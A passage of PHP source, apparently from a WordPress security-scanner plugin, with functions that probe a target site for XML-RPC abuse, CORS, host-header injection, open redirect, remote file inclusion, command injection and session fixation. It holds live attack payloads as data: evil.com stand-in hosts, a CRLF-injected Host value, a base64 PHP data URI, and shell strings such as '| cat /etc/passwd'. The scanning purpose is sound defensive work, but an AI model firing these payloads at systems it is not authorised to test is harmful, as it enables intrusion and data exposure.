    $this->debug_log[] = "Testing XML-RPC security on: $url";

    $xmlrpc_url = $url . '/xmlrpc.php';

    // Test if XML-RPC is enabled
    $response = $this->cached_request($xmlrpc_url);
    if (is_wp_error($response)) {
      return null; // XML-RPC not accessible
    }

    $body = wp_remote_retrieve_body($response);
    $code = wp_remote_retrieve_response_code($response);

    // Check if XML-RPC is enabled and responding
    if ($code == 200 && stripos($body, 'XML-RPC server accepts POST requests only') !== false) {
      // XML-RPC is enabled, test for vulnerabilities

      // Test for brute force amplification
      $brute_force_payload = '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>password</string></value></param></params></methodCall>';

      $args = array_merge($this->http_args, [
        'method' => 'POST',
        'body' => $brute_force_payload,
        'headers' => array_merge($this->http_args['headers'], [
          'Content-Type' => 'text/xml',
        ]),
      ]);

      $brute_response = wp_remote_post($xmlrpc_url, $args);
      if (!is_wp_error($brute_response)) {
        $brute_body = wp_remote_retrieve_body($brute_response);

        // Check for successful auth or user enumeration
        if (
          stripos($brute_body, '<value><string>admin</string></value>') !== false ||
          stripos($brute_body, 'Incorrect username or password') !== false
        ) {
          return [
            'affected_url' => $xmlrpc_url,
            'description' => 'XML-RPC enabled with potential brute force vulnerabilities',
            'impact' => 'Attackers can perform amplified brute force attacks and user enumeration',
            'recommendation' => 'Disable XML-RPC if not needed, or implement rate limiting and strong passwords',
            'steps_to_reproduce' => '1. Check if ' . $xmlrpc_url . ' responds\n2. Test authentication methods\n3. Verify rate limiting',
            'evidence_url' => $xmlrpc_url,
            'screenshot_paths' => [$this->take_screenshot($xmlrpc_url, 'xmlrpc_' . time())]
          ];
        }
      }

      // Test for DDoS amplification
      $pingback_payload = '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://evil.com/</string></value></param><param><value><string>' . $url . '</string></value></param></params></methodCall>';

      $pingback_args = array_merge($this->http_args, [
        'method' => 'POST',
        'body' => $pingback_payload,
        'headers' => array_merge($this->http_args['headers'], [
          'Content-Type' => 'text/xml',
        ]),
      ]);

      $pingback_response = wp_remote_post($xmlrpc_url, $pingback_args);
      if (!is_wp_error($pingback_response)) {
        return [
          'affected_url' => $xmlrpc_url,
          'description' => 'XML-RPC pingback enabled - potential DDoS amplification',
          'impact' => 'Attackers can use pingback for DDoS amplification attacks',
          'recommendation' => 'Disable XML-RPC pingback functionality or restrict access',
          'steps_to_reproduce' => '1. Send pingback request to ' . $xmlrpc_url . '\n2. Verify if pingback is processed',
          'evidence_url' => $xmlrpc_url,
          'screenshot_paths' => [$this->take_screenshot($xmlrpc_url, 'xmlrpc_pingback_' . time())]
        ];
      }
    }

    return null;
  }
  private function test_rest_api_endpoint_security($url, $vuln)
  {
    $this->debug_log[] = "Testing REST API security (Fast Check) on: $url";

    // Primary information leakage endpoints
    $api_endpoints = [
      '/wp-json/wp/v2/users',
      '/wp-json/wp/v2/posts'
    ];

    foreach ($api_endpoints as $endpoint) {
      $test_url = $url . $endpoint;
      $response = $this->cached_request($test_url);

      if (!is_wp_error($response)) {
        $body = wp_remote_retrieve_body($response);
        $code = wp_remote_retrieve_response_code($response);

        if ($code == 200) {
          $data = json_decode($body, true);

          if (stripos($endpoint, 'users') !== false && is_array($data) && !empty($data)) {
            return [
              'affected_url' => $test_url,
              'description' => 'REST API exposes user info',
              'impact' => 'User enumeration risk.',
              'recommendation' => 'Restrict REST API access.',
              'steps_to_reproduce' => "Access {$test_url}",
              'evidence_url' => $test_url,
              'screenshot_paths' => [$this->take_screenshot($test_url, 'rest_users_' . time())]
            ];
          }

          if (stripos($endpoint, 'posts') !== false && is_array($data) && !empty($data)) {
            return [
              'affected_url' => $test_url,
              'description' => 'REST API exposes post content',
              'impact' => 'Information disclosure.',
              'recommendation' => 'Restrict REST API endpoints.',
              'steps_to_reproduce' => "Access {$test_url}",
              'evidence_url' => $test_url,
              'screenshot_paths' => [$this->take_screenshot($test_url, 'rest_posts_' . time())]
            ];
          }
        }
      }
    }

    return null;
  }
  private function test_brute_force_protection($url, $vuln)
  {
    return null;
  }
  private function test_session_management($url, $vuln)
  {
    return null;
  }
  private function test_security_headers($url, $vuln)
  {
    $response = $this->cached_request($url);
    if (is_wp_error($response)) return null;

    $headers = wp_remote_retrieve_headers($response);
    $missing_headers = [];

    // Check for critical security headers
    $required_headers = [
      'X-Frame-Options' => 'Protects against clickjacking attacks',
      'X-Content-Type-Options' => 'Prevents MIME type sniffing',
      'X-XSS-Protection' => 'Enables XSS filtering in browsers',
      'Strict-Transport-Security' => 'Enforces HTTPS connections',
      'Content-Security-Policy' => 'Prevents XSS and other injection attacks',
    ];

    foreach ($required_headers as $header => $description) {
      if (!isset($headers[$header]) && !isset($headers[strtolower($header)])) {
        $missing_headers[] = $header . ' - ' . $description;
      }
    }

    if (!empty($missing_headers)) {
      // Format headers for readability (Human Readable 'Key: Value')
      $formatted_content = "";
      foreach ($headers as $key => $values) {
        if (is_array($values)) {
          foreach ($values as $value) {
            $formatted_content .= "$key: $value\n";
          }
        } else {
          $formatted_content .= "$key: $values\n";
        }
      }

      // Capture technical evidence for the screenshot
      $evidence = [
        'type' => 'headers',
        'content' => $formatted_content,
        'notes' => 'The following headers were captured. The required security headers listed in the description are missing.'
      ];

      return [
        'affected_url' => $url,
        'description' => $vuln['description'],
        'impact' => 'Missing security headers: ' . implode(', ', array_keys($required_headers)),
        'recommendation' => $vuln['remediation'],
        'steps_to_reproduce' => "1. Access $url\n2. Check response headers\n3. Verify missing: " . implode(', ', array_keys($required_headers)),
        'evidence_url' => $url,
        'screenshot_paths' => [$this->take_screenshot($url, 'security_headers_' . time(), $evidence)]
      ];
    }

    return null;
  }

  private function test_ssl_tls_configuration($url, $vuln)
  {
    $this->debug_log[] = "Testing SSL/TLS configuration on: $url";

    // Parse URL to check if HTTPS
    $parsed = parse_url($url);
    if ($parsed['scheme'] !== 'https') {
      return [
        'affected_url' => $url,
        'description' => 'Site is not using HTTPS encryption',
        'impact' => 'All traffic is sent in plain text, vulnerable to eavesdropping and man-in-the-middle attacks',
        'recommendation' => 'Enable HTTPS with a valid SSL certificate and redirect all HTTP traffic to HTTPS',
        'steps_to_reproduce' => '1. Check URL scheme\n2. Verify SSL certificate validity\n3. Test for HSTS header',
        'evidence_url' => $url,
        'screenshot_paths' => [$this->take_screenshot($url, 'ssl_config_' . time())]
      ];
    }

    // Test SSL certificate
    $response = $this->cached_request($url);
    if (is_wp_error($response)) {
      return [
        'affected_url' => $url,
        'description' => 'SSL/TLS certificate validation failed',
        'impact' => 'Certificate may be expired, self-signed, or from untrusted CA',
        'recommendation' => 'Install a valid SSL certificate from a trusted Certificate Authority',
        'steps_to_reproduce' => '1. Check SSL certificate details\n2. Verify expiration date\n3. Confirm certificate chain',
        'evidence_url' => $url,
        'screenshot_paths' => [$this->take_screenshot($url, 'ssl_cert_' . time())]
      ];
    }

    // Check for HSTS header
    $headers = wp_remote_retrieve_headers($response);
    if (!isset($headers['strict-transport-security']) && !isset($headers['Strict-Transport-Security'])) {
      return [
        'affected_url' => $url,
        'description' => 'Missing HTTP Strict Transport Security (HSTS) header',
        'impact' => 'Browser will not enforce HTTPS-only connections, vulnerable to SSL stripping attacks',
        'recommendation' => 'Add Strict-Transport-Security header with appropriate max-age value',
        'steps_to_reproduce' => '1. Check response headers\n2. Look for Strict-Transport-Security header',
        'evidence_url' => $url,
        'screenshot_paths' => [$this->take_screenshot($url, 'hsts_missing_' . time())]
      ];
    }

    return null;
  }
  private function test_database_security_config($url, $vuln)
  {
    return null;
  }
  private function test_file_permissions($url, $vuln)
  {
    return null;
  }
  private function test_wp_config_protection($url, $vuln)
  {
    $this->debug_log[] = "Testing wp-config.php protection on: $url";

    $test_urls = [
      $url . '/wp-config.php',
      $url . '/wp-config-sample.php',
      $url . '/wp-config-backup.php',
      $url . '/wp-config.php.bak',
      $url . '/wp-config.php~',
      $url . '/wp-config.php.save',
    ];

    foreach ($test_urls as $test_url) {
      $response = $this->cached_request($test_url);
      if (!is_wp_error($response)) {
        $code = wp_remote_retrieve_response_code($response);
        if ($code == 200) {
          $body = wp_remote_retrieve_body($response);
          // Check if it contains WordPress config content
          if (stripos($body, 'DB_NAME') !== false || stripos($body, 'DB_USER') !== false) {
            return [
              'affected_url' => $test_url,
              'description' => 'WordPress configuration file is publicly accessible',
              'impact' => 'Attackers can obtain database credentials, salts, and other sensitive configuration',
              'recommendation' => 'Move wp-config.php above web root or add server-level access restrictions',
              'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check if config file contents are visible',
              'evidence_url' => $test_url,
              'screenshot_paths' => [$this->take_screenshot($test_url, 'wp_config_exposed_' . time())]
            ];
          }
        }
      }
    }

    return null;
  }
  private function test_htaccess_security_rules($url, $vuln)
  {
    $this->debug_log[] = "Testing .htaccess security rules on: $url";

    // Test for exposed sensitive files that should be protected
    $sensitive_files = [
      '.htaccess',
      '.htpasswd',
      'config.php',
      'configuration.php',
      'settings.php',
      'wp-config.php',
      'wp-config-sample.php',
      '.env',
      '.git/config',
      '.svn/entries',
      'composer.json',
      'package.json',
      'phpinfo.php',
      'server-status',
      'server-info',
    ];

    foreach ($sensitive_files as $file) {
      $test_url = $url . '/' . $file;
      $response = $this->cached_request($test_url);

      if (!is_wp_error($response)) {
        $code = wp_remote_retrieve_response_code($response);

        // If file is accessible (not blocked by .htaccess)
        if ($code == 200) {
          $body = wp_remote_retrieve_body($response);

          // Check if it actually contains sensitive content
          $sensitive_indicators = [
            'RewriteEngine',
            'RewriteRule',
            'DB_NAME',
            'DB_USER',
            'DB_PASSWORD',
            'AUTH_KEY',
            'SECURE_AUTH_KEY',
            '[core]',
            'repositoryformatversion',
            'composer',
            'require',
            'autoload',
            'PHP Version',
            'System',
            'Build Date',
          ];

          $is_sensitive = false;
          foreach ($sensitive_indicators as $indicator) {
            if (stripos($body, $indicator) !== false) {
              $is_sensitive = true;
              break;
            }
          }

          if ($is_sensitive) {
            return [
              'affected_url' => $test_url,
              'description' => 'Sensitive file accessible - .htaccess protection missing',
              'impact' => 'Attackers can access configuration files, source code, or system information',
              'recommendation' => 'Add .htaccess rules to deny access to sensitive files and directories',
              'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Verify file contents are visible',
              'evidence_url' => $test_url,
              'screenshot_paths' => [$this->take_screenshot($test_url, 'htaccess_bypass_' . time())]
            ];
          }
        }
      }
    }

    return null;
  }
  private function test_debug_mode_exposure($url, $vuln)
  {
    return null;
  }
  private function test_database_error_disclosure($url, $vuln)
  {
    $this->debug_log[] = "Testing database error disclosure on: $url";

    // Test various endpoints that might trigger database errors
    $test_urls = [
      $url . '/?p=999999999', // Non-existent post
      $url . '/?cat=999999999', // Non-existent category
      $url . '/?tag=nonexistent123', // Random tag
      $url . '/wp-admin/nonexistent.php', // Non-existent admin page
    ];

    foreach ($test_urls as $test_url) {
      $response = $this->cached_request($test_url);
      if (!is_wp_error($response)) {
        $body = wp_remote_retrieve_body($response);
        $code = wp_remote_retrieve_response_code($response);

        // Look for database error patterns
        $db_errors = [
          'mysql_fetch_array',
          'mysql_fetch_row',
          'mysql_num_rows',
          'mysql_query',
          'mysqli_fetch_array',
          'mysqli_fetch_row',
          'mysqli_num_rows',
          'mysqli_query',
          'WordPress database error',
          'Error establishing database connection',
          'DB connection failed',
          'SQL syntax',
          'Unknown column',
          'Table \'',
          ' doesn\'t exist',
        ];

        foreach ($db_errors as $error) {
          if (stripos($body, $error) !== false) {
            return [
              'affected_url' => $test_url,
              'description' => 'Database error messages are being disclosed',
              'impact' => 'Attackers can gather information about database structure and potentially exploit SQL injection',
              'recommendation' => 'Disable WP_DEBUG in production, use proper error handling, and configure server not to display PHP errors',
              'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check for database error messages in response',
              'evidence_url' => $test_url,
              'screenshot_paths' => [$this->take_screenshot($test_url, 'db_error_' . time())]
            ];
          }
        }
      }
    }

    return null;
  }
  private function test_php_error_reporting($url, $vuln)
  {
    $this->debug_log[] = "Testing PHP error disclosure on: $url";

    // Test endpoints that might trigger PHP errors
    $test_urls = [
      $url . '/wp-content/nonexistent.php',
      $url . '/wp-includes/nonexistent.php',
      $url . '/wp-admin/includes/nonexistent.php',
    ];

    foreach ($test_urls as $test_url) {
      $response = $this->cached_request($test_url);
      if (!is_wp_error($response)) {
        $body = wp_remote_retrieve_body($response);

        // Look for PHP error patterns
        $php_errors = [
          'PHP Warning',
          'PHP Notice',
          'PHP Fatal error',
          'PHP Parse error',
          'Warning:',
          'Notice:',
          'Fatal error:',
          'Parse error:',
          'Undefined variable',
          'Undefined index',
          'Call to undefined function',
          'Cannot redeclare',
          'syntax error',
          'unexpected',
        ];

        foreach ($php_errors as $error) {
          if (stripos($body, $error) !== false) {
            return [
              'affected_url' => $test_url,
              'description' => 'PHP error messages are being displayed',
              'impact' => 'Attackers can gather information about file paths, function calls, and potentially find exploitable code',
              'recommendation' => 'Set display_errors to Off in php.ini, use proper error logging instead',
              'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check for PHP error messages in response',
              'evidence_url' => $test_url,
              'screenshot_paths' => [$this->take_screenshot($test_url, 'php_error_' . time())]
            ];
          }
        }
      }
    }

    return null;
  }
  private function test_backup_file_exposure($url, $vuln)
  {
    return null;
  }
  private function test_configuration_file_exposure($url, $vuln)
  {
    $this->debug_log[] = "Testing configuration file exposure on: $url";

    // Common configuration files that might be exposed
    $config_files = [
      'config.php',
      'configuration.php',
      'settings.php',
      'database.php',
      'db.php',
      'connect.php',
      'includes/config.php',
      'includes/database.php',
      'admin/config.php',
      'system/config.php',
      'application/config/database.php',
      'app/config/database.php',
      'config/database.php',
      'local.php',
      'production.php',
      'development.php',
    ];

    foreach ($config_files as $file) {
      $test_url = $url . '/' . $file;
      $response = $this->cached_request($test_url);

      if (!is_wp_error($response)) {
        $code = wp_remote_retrieve_response_code($response);

        if ($code == 200) {
          $body = wp_remote_retrieve_body($response);

          // Check for configuration content indicators
          $config_indicators = [
            'mysql_connect',
            'mysqli_connect',
            'PDO(',
            'DB_HOST',
            'DB_USER',
            'DB_PASS',
            'DB_NAME',
            'password',
            'username',
            'database',
            'host',
            'port',
            'charset',
            'define(',
            'const ',
            '$config',
            'array(',
            '=>',
          ];

          $is_config = false;
          foreach ($config_indicators as $indicator) {
            if (stripos($body, $indicator) !== false) {
              $is_config = true;
              break;
            }
          }

          if ($is_config) {
            return [
              'affected_url' => $test_url,
              'description' => 'Configuration file exposed - contains database credentials or settings',
              'impact' => 'Attackers can obtain database access, API keys, or other sensitive configuration',
              'recommendation' => 'Move config files outside web root, use environment variables, or restrict access',
              'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check for database credentials or config data',
              'evidence_url' => $test_url,
              'screenshot_paths' => [$this->take_screenshot($test_url, 'config_exposed_' . time())]
            ];
          }
        }
      }
    }

    return null;
  }
  private function test_log_file_exposure($url, $vuln)
  {
    return null;
  }
  private function test_source_code_disclosure($url, $vuln)
  {
    return null;
  }
  private function test_clickjacking_protection($url, $vuln)
  {
    return null;
  }
  private function test_mime_type_sniffing_protection($url, $vuln)
  {
    return null;
  }
  private function test_cors_configuration($url, $vuln)
  {
    $this->debug_log[] = "Testing CORS configuration on: $url";

    // Test CORS headers with different origins
    $test_origins = [
      'http://evil.com',
      'https://evil.com',
      'null',
      'http://localhost',
      'file://',
    ];

    foreach ($test_origins as $origin) {
      $args = array_merge($this->http_args, [
        'headers' => array_merge($this->http_args['headers'], [
          'Origin' => $origin,
        ]),
      ]);

      $response = $this->cached_request($url, $args);
      if (!is_wp_error($response)) {
        $headers = wp_remote_retrieve_headers($response);

        // Check Access-Control-Allow-Origin header
        $allow_origin = isset($headers['access-control-allow-origin']) ?
          $headers['access-control-allow-origin'] : (isset($headers['Access-Control-Allow-Origin']) ? $headers['Access-Control-Allow-Origin'] : null);

        if ($allow_origin) {
          // Check for overly permissive CORS
          if (
            $allow_origin === '*' ||
            $allow_origin === $origin ||
            (is_array($allow_origin) && in_array('*', $allow_origin))
          ) {

            // Check for credentials allowed with wildcard
            $allow_credentials = isset($headers['access-control-allow-credentials']) ?
              $headers['access-control-allow-credentials'] : (isset($headers['Access-Control-Allow-Credentials']) ? $headers['Access-Control-Allow-Credentials'] : null);

            if ($allow_origin === '*' && $allow_credentials) {
              return [
                'affected_url' => $url,
                'description' => 'CORS misconfiguration: credentials allowed with wildcard origin',
                'impact' => 'Attackers can make authenticated requests from any origin, leading to CSRF-like attacks',
                'recommendation' => 'Specify allowed origins explicitly, avoid wildcard with credentials',
                'steps_to_reproduce' => '1. Send request with Origin: ' . $origin . '\n2. Check CORS headers in response',
                'evidence_url' => $url,
                'screenshot_paths' => [$this->take_screenshot($url, 'cors_' . time())]
              ];
            }

            if ($allow_origin === '*') {
              return [
                'affected_url' => $url,
                'description' => 'CORS allows all origins (*)',
                'impact' => 'Any website can make requests to this site, potentially leading to CSRF attacks',
                'recommendation' => 'Restrict CORS origins to specific trusted domains only',
                'steps_to_reproduce' => '1. Check Access-Control-Allow-Origin header\n2. Verify if it allows all origins',
                'evidence_url' => $url,
                'screenshot_paths' => [$this->take_screenshot($url, 'cors_wildcard_' . time())]
              ];
            }
          }
        }
      }
    }

    return null;
  }
  private function test_subresource_integrity($url, $vuln)
  {
    return null;
  }
  private function test_content_security_policy($url, $vuln)
  {
    $this->debug_log[] = "Testing Content Security Policy on: $url";

    $response = $this->cached_request($url);
    if (is_wp_error($response)) return null;

    $headers = wp_remote_retrieve_headers($response);

    // Check for CSP header
    $csp_header = isset($headers['content-security-policy']) ?
      $headers['content-security-policy'] : (isset($headers['Content-Security-Policy']) ? $headers['Content-Security-Policy'] : null);

    if (!$csp_header) {
      return [
        'affected_url' => $url,
        'description' => 'Missing Content Security Policy (CSP) header',
        'impact' => 'No protection against XSS attacks, inline scripts, and other code injection',
        'recommendation' => 'Implement a Content Security Policy header to mitigate XSS and injection attacks',
        'steps_to_reproduce' => '1. Check response headers\n2. Verify absence of Content-Security-Policy header',
        'evidence_url' => $url,
        'screenshot_paths' => [$this->take_screenshot($url, 'csp_missing_' . time())]
      ];
    }

    // Analyze CSP for weaknesses
    $csp_value = is_array($csp_header) ? $csp_header[0] : $csp_header;

    // Check for unsafe directives
    $unsafe_patterns = [
      'unsafe-inline',
      'unsafe-eval',
      'data:',
      'blob:',
      '*',
    ];

    foreach ($unsafe_patterns as $pattern) {
      if (stripos($csp_value, $pattern) !== false) {
        return [
          'affected_url' => $url,
          'description' => 'Content Security Policy allows unsafe content: ' . $pattern,
          'impact' => 'XSS attacks may still be possible due to permissive CSP rules',
          'recommendation' => 'Review and tighten CSP directives, avoid unsafe-* keywords when possible',
          'steps_to_reproduce' => '1. Check Content-Security-Policy header\n2. Look for unsafe directives like ' . $pattern,
          'evidence_url' => $url,
          'screenshot_paths' => [$this->take_screenshot($url, 'csp_weak_' . time())]
        ];
      }
    }

    return null;
  }
  private function test_referrer_policy($url, $vuln)
  {
    return null;
  }
  private function test_feature_policy_permissions_policy($url, $vuln)
  {
    return null;
  }
  private function test_insecure_http_methods($url, $vuln)
  {
    return null;
  }
  private function test_http_verb_tampering($url, $vuln)
  {
    return null;
  }
  private function test_cache_poisoning($url, $vuln)
  {
    return null;
  }
  private function test_host_header_injection($url, $vuln)
  {
    $this->debug_log[] = "Testing host header injection on: $url";

    // Test with malicious host headers
    $malicious_hosts = [
      'evil.com',
      '127.0.0.1',
      'localhost',
      'evil.com:80',
      'evil.com%0d%0aSet-Cookie:malicious=value',
    ];

    foreach ($malicious_hosts as $host) {
      $args = array_merge($this->http_args, [
        'headers' => array_merge($this->http_args['headers'], [
          'Host' => $host,
        ]),
      ]);

      $response = $this->cached_request($url, $args);
      if (!is_wp_error($response)) {
        $body = wp_remote_retrieve_body($response);
        $headers = wp_remote_retrieve_headers($response);

        // Check if host header is reflected in response
        if (stripos($body, $host) !== false) {
          return [
            'affected_url' => $url,
            'description' => 'Host header injection vulnerability - host header reflected in response',
            'impact' => 'Attackers can perform cache poisoning, SSRF, or bypass security controls',
            'recommendation' => 'Validate and sanitize Host header, avoid using it in application logic',
            'steps_to_reproduce' => '1. Send request with Host: ' . $host . '\n2. Check if host is reflected in response',
            'evidence_url' => $url,
            'screenshot_paths' => [$this->take_screenshot($url, 'host_injection_' . time())]
          ];
        }

        // Check for HTTP header injection
        if (isset($headers['set-cookie']) && stripos($headers['set-cookie'], 'malicious=value') !== false) {
          return [
            'affected_url' => $url,
            'description' => 'HTTP header injection via Host header',
            'impact' => 'Attackers can inject arbitrary HTTP headers, leading to cache poisoning or response splitting',
            'recommendation' => 'Sanitize Host header input, prevent CRLF sequences',
            'steps_to_reproduce' => '1. Send Host header with CRLF injection\n2. Check for injected headers in response',
            'evidence_url' => $url,
            'screenshot_paths' => [$this->take_screenshot($url, 'header_injection_' . time())]
          ];
        }
      }
    }

    return null;
  }
  private function test_open_redirect($url, $vuln)
  {
    $this->debug_log[] = "Testing open redirect on: $url";

    // Common redirect parameters
    $redirect_params = ['redirect', 'url', 'return', 'next', 'continue', 'redir', 'redirect_to', 'return_url'];

    // Malicious redirect targets
    $evil_urls = [
      'http://evil.com',
      'https://evil.com',
      '//evil.com',
      'javascript:alert("XSS")',
      'data:text/html,<script>alert("XSS")</script>',
    ];

    foreach ($redirect_params as $param) {
      foreach ($evil_urls as $evil_url) {
        $test_url = $url . '/?' . $param . '=' . urlencode($evil_url);
        $response = $this->cached_request($test_url, ['redirection' => 0]); // Don't follow redirects

        if (!is_wp_error($response)) {
          $code = wp_remote_retrieve_response_code($response);
          $headers = wp_remote_retrieve_headers($response);

          // Check for redirect response
          if (in_array($code, [301, 302, 303, 307, 308])) {
            $location = isset($headers['location']) ? $headers['location'] : (isset($headers['Location']) ? $headers['Location'] : null);

            if ($location && (stripos($location, 'evil.com') !== false || stripos($location, 'javascript:') !== false)) {
              return [
                'affected_url' => $test_url,
                'description' => 'Open redirect vulnerability detected',
                'impact' => 'Attackers can redirect users to malicious sites for phishing or credential theft',
                'recommendation' => 'Validate redirect URLs against allowlist, use relative URLs, or remove redirect functionality',
                'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check if redirect occurs to external site',
                'evidence_url' => $test_url,
                'screenshot_paths' => [$this->take_screenshot($test_url, 'open_redirect_' . time())]
              ];
            }
          }
        }
      }
    }

    return null;
  }
  private function test_lfi_protection($url, $vuln)
  {
    return null;
  }
  private function test_rfi_protection($url, $vuln)
  {
    $this->debug_log[] = "Testing RFI protection on: $url";

    // RFI test payloads
    $rfi_payloads = [
      'http://evil.com/malicious.php',
      'https://evil.com/shell.txt',
      'http://127.0.0.1/shell.php',
      'data:text/plain;base64,PD9waHAgZWNobyAicmZpIjs/Pgo=', // PHP code in data URI
    ];

    // Common vulnerable parameters
    $test_params = ['file', 'include', 'require', 'load', 'template', 'page', 'path', 'dir'];

    foreach ($test_params as $param) {
      foreach ($rfi_payloads as $payload) {
        $test_url = $url . '/?' . $param . '=' . urlencode($payload);
        $response = $this->cached_request($test_url);

        if (!is_wp_error($response)) {
          $body = wp_remote_retrieve_body($response);
          $code = wp_remote_retrieve_response_code($response);

          // Check for RFI success indicators
          $rfi_indicators = [
            'rfi', // Our test payload
            'malicious', // From payload
            'PD9waHAg', // Base64 PHP header
            'shell', // Common shell indicator
          ];

          foreach ($rfi_indicators as $indicator) {
            if (stripos($body, $indicator) !== false) {
              return [
                'affected_url' => $test_url,
                'description' => 'Remote File Inclusion (RFI) vulnerability detected',
                'impact' => 'Attackers can execute arbitrary code or include malicious files',
                'recommendation' => 'Disable allow_url_include, validate file paths, use allowlists for includes',
                'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check if remote file content is included',
                'evidence_url' => $test_url,
                'screenshot_paths' => [$this->take_screenshot($test_url, 'rfi_' . time())]
              ];
            }
          }
        }
      }
    }

    return null;
  }
  private function test_command_injection_protection($url, $vuln)
  {
    $this->debug_log[] = "Testing command injection protection on: $url";

    // Command injection payloads
    $cmd_payloads = [
      '; id',
      '| id',
      '`id`',
      '$(id)',
      '; uname -a',
      '| cat /etc/passwd',
      '; ping -c 1 127.0.0.1',
      '| whoami',
    ];

    // Test common vulnerable parameters that might execute commands
    $test_params = ['cmd', 'exec', 'command', 'run', 'shell', 'system', 'query'];

    foreach ($test_params as $param) {
      foreach ($cmd_payloads as $payload) {
        $test_url = $url . '/?' . $param . '=' . urlencode($payload);
        $response = $this->cached_request($test_url);

        if (!is_wp_error($response)) {
          $body = wp_remote_retrieve_body($response);

          // Check for command execution indicators
          $cmd_indicators = [
            'uid=', // id command output
            'gid=', // id command output
            'Linux', // uname output
            'root:', // passwd file content
            'bin/bash', // passwd content
            '127.0.0.1', // ping output (if command executed)
          ];

          foreach ($cmd_indicators as $indicator) {
            if (stripos($body, $indicator) !== false) {
              return [
                'affected_url' => $test_url,
                'description' => 'Command injection vulnerability detected',
                'impact' => 'Attackers can execute arbitrary system commands on the server',
                'recommendation' => 'Use safe APIs, validate input, escape shell arguments, avoid shell execution',
                'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check for command execution output',
                'evidence_url' => $test_url,
                'screenshot_paths' => [$this->take_screenshot($test_url, 'command_injection_' . time())]
              ];
            }
          }
        }
      }
    }

    return null;
  }
  private function test_template_injection_protection($url, $vuln)
  {
    return null;
  }
  private function test_email_header_injection_protection($url, $vuln)
  {
    return null;
  }
  private function test_password_reset_vulnerability($url, $vuln)
  {
    return null;
  }
  private function test_account_takeover_email_change($url, $vuln)
  {
    return null;
  }
  private function test_session_fixation_protection($url, $vuln)
  {
    $this->debug_log[] = "Testing session fixation protection on: $url";

    // Test session fixation by setting session cookies
    $test_session_ids = [
      'testsession123',
      'fixation_test_456',
      'evil_session_789',
    ];

    foreach ($test_session_ids as $session_id) {
      $args = array_merge($this->http_args, [
        'headers' => array_merge($this->http_args['headers'], [
          'Cookie' => 'PHPSESSID=' . $session_id . '; wordpress_logged_in_test=admin|1234567890|abcdef; wp-settings-time-1=1234567890',
        ]),
      ]);

      $response = $this->cached_request($url, $args);
      if (!is_wp_error($response)) {
        $headers = wp_remote_retrieve_headers($response);
        $body = wp_remote_retrieve_body($response);

        // Check if session ID is accepted/reflected
        $set_cookie = isset($headers['set-cookie']) ? $headers['set-cookie'] : (isset($headers['Set-Cookie']) ? $headers['Set-Cookie'] : null);

        if ($set_cookie) {
          // Check if our session ID is being used or a new one is set
          if (is_array($set_cookie)) {
            foreach ($set_cookie as $cookie) {
              if (stripos($cookie, 'PHPSESSID=' . $session_id) !== false) {
                return [
                  'affected_url' => $url,
                  'description' => 'Potential session fixation vulnerability - provided session ID accepted',
                  'impact' => 'Attackers can set known session IDs for victims, hijacking authenticated sessions',
                  'recommendation' => 'Regenerate session IDs after login, validate session integrity',
                  'steps_to_reproduce' => '1. Set session cookie to known value\n2. Check if server accepts the provided session ID',
                  'evidence_url' => $url,
                  'screenshot_paths' => [$this->take_screenshot($url, 'session_fixation_' . time())]
                ];
              }
            }
          } elseif (is_string($set_cookie) && stripos($set_cookie, 'PHPSESSID=' . $session_id) !== false) {
            return [
              'affected_url' => $url,
              'description' => 'Session fixation vulnerability - attacker-controlled session ID accepted',
              'impact' => 'Attackers can perform session fixation attacks',
              'recommendation' => 'Implement proper session management and regeneration',
              'steps_to_reproduce' => '1. Send request with predetermined session ID\n2. Verify if session ID is maintained',
              'evidence_url' => $url,
              'screenshot_paths' => [$this->take_screenshot($url, 'session_fixation_' . time())]
            ];
          }
        }

        // Check for WordPress-specific session handling
        if (stripos($body, 'wordpress_logged_in') !== false) {
          return [
            'affected_url' => $url,
            'description' => 'WordPress session handling may be vulnerable to fixation',
            'impact' => 'Authenticated sessions could be hijacked via session fixation',
            'recommendation' => 'Ensure WordPress session regeneration on login and privilege changes',
            'steps_to_reproduce' => '1. Check WordPress session cookie handling\n2. Verify session regeneration mechanisms',
            'evidence_url' => $url,
            'screenshot_paths' => [$this->take_screenshot($url, 'wp_session_' . time())]
          ];
        }
      }
    }

    return null;
  }
  private function test_session_timeout_protection($url, $vuln)
  {
    return null;
  }
  private function test_concurrent_session_control($url, $vuln)
  {
    return null;
  }
  private function test_cookie_security_attributes($url, $vuln)
  {
    $this->debug_log[] = "Testing cookie security attributes on: $url";

    $response = $this->cached_request($url);
    if (is_wp_error($response)) return null;

    $headers = wp_remote_retrieve_headers($response);
    $set_cookie = isset($headers['set-cookie']) ? $headers['set-cookie'] : (isset($headers['Set-Cookie']) ? $headers['Set-Cookie'] : null);

    if (!$set_cookie) {
      // No cookies set, which is actually good for security
      return null;
    }

    // Handle both string and array cookie headers
    $cookies = is_array($set_cookie) ? $set_cookie : [$set_cookie];

    foreach ($cookies as $cookie_header) {
      // Parse cookie attributes
      $cookie_parts = explode(';', $cookie_header);
      $cookie_name_value = trim($cookie_parts[0]);

      // Extract cookie attributes
      $attributes = [];
      for ($i = 1; $i < count($cookie_parts); $i++) {
        $attr = trim($cookie_parts[$i]);
        $attr_parts = explode('=', $attr, 2);
        $attr_name = strtolower(trim($attr_parts[0]));
        $attr_value = isset($attr_parts[1]) ? trim($attr_parts[1]) : true;
        $attributes[$attr_name] = $attr_value;
      }

      // Check for missing Secure flag on HTTPS
      if (stripos($url, 'https://') === 0 && !isset($attributes['secure'])) {
        return [
          'affected_url' => $url,
          'description' => 'Cookie missing Secure flag over HTTPS',
          'impact' => 'Cookies can be transmitted over unencrypted connections',
          'recommendation' => 'Add Secure flag to all cookies transmitted over HTTPS',
          'steps_to_reproduce' => '1. Check Set-Cookie headers\n2. Verify Secure flag is present for HTTPS sites',
          'evidence_url' => $url,
          'screenshot_paths' => [$this->take_screenshot($url, 'cookie_secure_' . time())]
